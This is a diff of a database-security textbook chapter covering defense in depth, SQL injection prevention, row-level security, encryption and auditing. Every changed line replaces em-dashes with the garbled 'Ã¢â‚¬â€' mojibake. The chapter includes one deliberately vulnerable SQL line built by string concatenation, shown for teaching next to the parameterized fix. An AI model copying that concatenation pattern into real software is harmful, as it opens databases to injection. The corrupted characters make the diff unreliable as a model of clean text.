+| **Authentication** | Verify identity | Passwords, Kerberos, MFA, LDAP | Medium Ã¢â‚¬â€ weak passwords, phishing | ~1-50ms per connection |
+| **Authorization** | Control operations | GRANT/REVOKE, RBAC | Low Ã¢â‚¬â€ bypass requires privilege escalation | Minimal (cached lookups) |
+| **Row-Level Security** | Filter rows by context | RLS policies, security predicates | Low Ã¢â‚¬â€ policy enforced by query rewriter | ~5-15% for policy evaluation |
+| **Encryption at Rest** | Protect data files | TDE, pgcrypto, LUKS | Low Ã¢â‚¬â€ unless key is compromised | ~3-5% I/O overhead |
+| **Auditing** | Detect and record | pgaudit, triggers, SIEM | Low Ã¢â‚¬â€ append-only prevents tampering | ~5-20% write throughput |
+| **Application** | Validate input before DB | Parameterized queries, ORM | High Ã¢â‚¬â€ most common bypass point | None on DB server |
 
-**Pseudocode â€” Defense-in-Depth Middleware:**
+**Pseudocode Ã¢â‚¬â€ Defense-in-Depth Middleware:**
 
 ```
 FUNCTION execute_safe_query(user, sql, params)
@@ -1891,7 +1891,7 @@ FUNCTION execute_safe_query(user, sql, params)
 END FUNCTION
 ```
 
-**Complexity Analysis â€” Layered Security:**
+**Complexity Analysis Ã¢â‚¬â€ Layered Security:**
 
 | Layer | Additional Latency | Bypass Difficulty | Maintenance Cost |
 |-------|-------------------|-------------------|-----------------|
@@ -1925,16 +1925,16 @@ END FUNCTION
 
 ### Q1: How do you prevent SQL injection?
 
-**Answer:** Parameterized queries (prepared statements) are the definitive defense. User input is never concatenated into SQL strings â€” it is bound as parameters. The database parses the SQL structure once, then fills in parameters separately, so user input can never alter the query structure.
+**Answer:** Parameterized queries (prepared statements) are the definitive defense. User input is never concatenated into SQL strings Ã¢â‚¬â€ it is bound as parameters. The database parses the SQL structure once, then fills in parameters separately, so user input can never alter the query structure.
 
 ```python
-# SAFE â€” parameterized
+# SAFE Ã¢â‚¬â€ parameterized
 cursor.execute("SELECT * FROM users WHERE username = %s", (username,))
-# VULNERABLE â€” concatenation
+# VULNERABLE Ã¢â‚¬â€ concatenation
 cursor.execute(f"SELECT * FROM users WHERE username = '{username}'")
 ```
 
-Additional layers: input validation (whitelist), ORM frameworks, stored procedures with bind variables, and least-privilege database accounts (app user cannot DROP). WAF is helpful but bypassable â€” never rely on it alone.
+Additional layers: input validation (whitelist), ORM frameworks, stored procedures with bind variables, and least-privilege database accounts (app user cannot DROP). WAF is helpful but bypassable Ã¢â‚¬â€ never rely on it alone.
 
 ### Q2: Explain the principle of least privilege in databases.
 
@@ -1960,11 +1960,11 @@ Additional layers: input validation (whitelist), ORM frameworks, stored procedur
 | Threat model | Physical theft, drive disposal, backup compromise | Network sniffing, MITM attacks |
 | Key management | DB server key, application key, KMS | CA-signed certificates |
 | Performance impact | 3-5% I/O overhead (TDE) | 2-10% latency for handshake |
-| Can I use only one? | No â€” both are required; they protect different threats |
+| Can I use only one? | No Ã¢â‚¬â€ both are required; they protect different threats |
 
 ### Q4: Explain database auditing and why it matters.
 
-**Answer:** Auditing records all security-relevant database activity â€” logins, DDL changes, DML on sensitive tables, privilege changes. It matters for:
+**Answer:** Auditing records all security-relevant database activity Ã¢â‚¬â€ logins, DDL changes, DML on sensitive tables, privilege changes. It matters for:
 - **Compliance:** GDPR, HIPAA, PCI-DSS require audit trails
 - **Forensics:** Reconstruct what happened after a breach
 - **Detection:** Identify suspicious patterns (mass deletes, after-hours access)
@@ -1975,7 +1975,7 @@ Implementation: pgaudit (PostgreSQL), built-in audit (Oracle), Audit Plugin (MyS
 ### Q5: What are the ACID properties and why do they matter for security?
 
 **Answer:** ACID (Atomicity, Consistency, Isolation, Durability) ensures transaction reliability. For security:
-- **Atomicity:** A security operation (GRANT, REVOKE, user creation) either fully completes or fully rolls back â€” no partial state
+- **Atomicity:** A security operation (GRANT, REVOKE, user creation) either fully completes or fully rolls back Ã¢â‚¬â€ no partial state
 - **Consistency:** Constraints ensure data integrity; foreign keys prevent orphaned records
 - **Isolation:** Concurrent security changes don't interfere
 - **Durability:** Security configuration persists through crashes
@@ -1992,7 +1992,7 @@ CREATE POLICY tenant_isolation ON orders
     USING (tenant_id = current_setting('app.tenant_id')::INT);
 ```
 
-When user from tenant 42 queries `SELECT * FROM orders`, the DB internally rewrites it to `SELECT * FROM orders WHERE tenant_id = 42`. The user cannot bypass this â€” only superusers can, which is why apps should never connect as superuser.
+When user from tenant 42 queries `SELECT * FROM orders`, the DB internally rewrites it to `SELECT * FROM orders WHERE tenant_id = 42`. The user cannot bypass this Ã¢â‚¬â€ only superusers can, which is why apps should never connect as superuser.
 
 ### Q7: Compare DAC, MAC, RBAC, and ABAC.
 
@@ -2117,7 +2117,7 @@ CREATE TRIGGER audit_payments AFTER INSERT OR UPDATE OR DELETE ON payments
     FOR EACH ROW EXECUTE FUNCTION audit_trigger();
 ```
 
-**Example 18.4: Python â€” Complete Secure Database Wrapper:**
+**Example 18.4: Python Ã¢â‚¬â€ Complete Secure Database Wrapper:**
 
 ```python
 import psycopg2
@@ -2137,7 +2137,7 @@ class SecureDB:
         return []
 
     def execute_file(self, sql_path: str) -> None:
-        """Execute SQL file â€” only allow known paths."""
+        """Execute SQL file Ã¢â‚¬â€ only allow known paths."""
         allowed_base = "/app/migrations/"
         abs_path = os.path.abspath(sql_path)
         if not abs_path.startswith(allowed_base):
@@ -2159,23 +2159,23 @@ class SecureDB:
 
 ## Pro Tips
 
-1. **Parameterized queries are non-negotiable** â€” no amount of input validation or escaping is safer than prepared statements with bound parameters. This is the #1 rule of database security.
-2. **Least privilege means column-level grants** â€” do not grant SELECT * to application users if they only need 3 columns. Every extra column is a potential data leak.
-3. **Encryption at rest is not a silver bullet** â€” it protects against physical theft but does not protect against SQL injection or authorized user misuse.
-4. **Audit logs are useless if not reviewed** â€” enable auditing and set up automated alerts for suspicious patterns (mass deletes, after-hours access, privilege escalation).
-5. **RLS is underused** â€” instead of filtering in WHERE clauses in every query, define RLS policies that automatically restrict rows based on user context.
-6. **Key management is the hardest part of encryption** â€” use AWS KMS, HashiCorp Vault, or Azure Key Vault. Never hardcode keys in source code or config files.
-7. **Test security controls regularly** â€” attempt SQL injection, try privilege escalation, verify RLS isolation, check encryption status. Document and fix gaps.
+1. **Parameterized queries are non-negotiable** Ã¢â‚¬â€ no amount of input validation or escaping is safer than prepared statements with bound parameters. This is the #1 rule of database security.
+2. **Least privilege means column-level grants** Ã¢â‚¬â€ do not grant SELECT * to application users if they only need 3 columns. Every extra column is a potential data leak.
+3. **Encryption at rest is not a silver bullet** Ã¢â‚¬â€ it protects against physical theft but does not protect against SQL injection or authorized user misuse.
+4. **Audit logs are useless if not reviewed** Ã¢â‚¬â€ enable auditing and set up automated alerts for suspicious patterns (mass deletes, after-hours access, privilege escalation).
+5. **RLS is underused** Ã¢â‚¬â€ instead of filtering in WHERE clauses in every query, define RLS policies that automatically restrict rows based on user context.
+6. **Key management is the hardest part of encryption** Ã¢â‚¬â€ use AWS KMS, HashiCorp Vault, or Azure Key Vault. Never hardcode keys in source code or config files.
+7. **Test security controls regularly** Ã¢â‚¬â€ attempt SQL injection, try privilege escalation, verify RLS isolation, check encryption status. Document and fix gaps.
 
 ## One-Sentence Takeaways
 
-- **18.1:** Database security requires defense in depth â€” layers of authentication, authorization, encryption, and auditing.
+- **18.1:** Database security requires defense in depth Ã¢â‚¬â€ layers of authentication, authorization, encryption, and auditing.
 - **18.2:** Authentication verifies identity (who you are); authorization determines access (what you can do).
-- **18.3:** SQL injection is the most critical database vulnerability â€” it is entirely preventable with parameterized queries.
+- **18.3:** SQL injection is the most critical database vulnerability Ã¢â‚¬â€ it is entirely preventable with parameterized queries.
 - **18.4:** Encryption at rest (TDE, column-level) and in transit (SSL/TLS) protects data from physical and network compromise.
 - **18.5:** Row-level security and dynamic data masking provide fine-grained access control beyond table-level GRANTs.
 - **18.6:** Auditing is essential for compliance (GDPR, HIPAA, PCI-DSS) and breach detection.
-- **18.7:** Backup security â€” encryption, access control, and regular restore testing â€” is the last line of defense.
+- **18.7:** Backup security Ã¢â‚¬â€ encryption, access control, and regular restore testing Ã¢â‚¬â€ is the last line of defense.
 - **18.8:** Defense in depth means no single layer is trusted; each layer assumes the one below it is compromised.
 
 ## Concept Comparison Table
@@ -2231,7 +2231,7 @@ The code below implements Role-Based Access Control (RBAC), encryption utilities
 
 ```typescript
 // ============================================================
-// Database Security Toolkit â€” TypeScript
+// Database Security Toolkit Ã¢â‚¬â€ TypeScript
 // ============================================================
 
 // === RBAC Implementation ===
@@ -2509,14 +2509,14 @@ flowchart TD
 ## Summary
 
 - Database security requires defense in depth: authentication, authorization, encryption, auditing, and backups.
-- SQL injection is the most critical risk â€” always use parameterized queries. No other defense is equivalent.
+- SQL injection is the most critical risk Ã¢â‚¬â€ always use parameterized queries. No other defense is equivalent.
 - Least privilege: grant minimum permissions needed, never use superuser for apps. Use column-level GRANTs.
 - Encryption at rest (TDE, column-level) protects data on disk; encryption in transit (TLS 1.3) protects data on the network. Both are required.
-- Row-level security automatically filters rows by user context â€” ideal for multi-tenant applications.
+- Row-level security automatically filters rows by user context Ã¢â‚¬â€ ideal for multi-tenant applications.
 - Dynamic data masking hides sensitive data from non-privileged users at query time.
 - Auditing is essential for compliance (GDPR, HIPAA, PCI-DSS) and breach detection. Append-only logs prevent tampering.
 - GDPR requires data minimization, right to be forgotten, and retention policies.
-- Key management is the hardest part of encryption â€” use KMS/Vault, never hardcode keys.
+- Key management is the hardest part of encryption Ã¢â‚¬â€ use KMS/Vault, never hardcode keys.
 - Backups must be encrypted, stored immutably, and tested regularly.
 
 ## Exercises
